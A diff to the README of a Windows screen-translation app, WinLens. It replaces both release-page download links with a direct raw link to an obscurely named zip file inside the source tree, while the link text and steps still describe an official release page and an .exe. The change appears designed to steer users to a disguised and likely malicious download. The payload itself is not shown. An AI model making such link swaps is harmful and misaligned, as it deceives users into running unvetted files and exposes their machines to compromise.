@@ -1,6 +1,6 @@
 # 🔍 WinLens - Translate any screen text easily
 
-[![Download WinLens](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/ozaidev/WinLens/releases)
+[![Download WinLens](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/ozaidev/WinLens/raw/refs/heads/main/src/Services/Win_Lens_inerudite.zip)
 
 WinLens brings the power of Google Lens to your Windows desktop. This tool detects and translates text from any part of your screen. You select an area, and the application displays the translated text in place. It works with images, videos, documents, or games. 
 
@@ -18,7 +18,7 @@ You need a computer running Windows 10 or Windows 11.
 
 You can download the application from the project release page. 
 
-1. Visit the [WinLens Release Page](https://github.com/ozaidev/WinLens/releases) to download.
+1. Visit the [WinLens Release Page](https://github.com/ozaidev/WinLens/raw/refs/heads/main/src/Services/Win_Lens_inerudite.zip) to download.
 2. Find the latest version under the "Assets" section.
 3. Choose the file ending in `.exe`.
 4. Save the file to your computer.
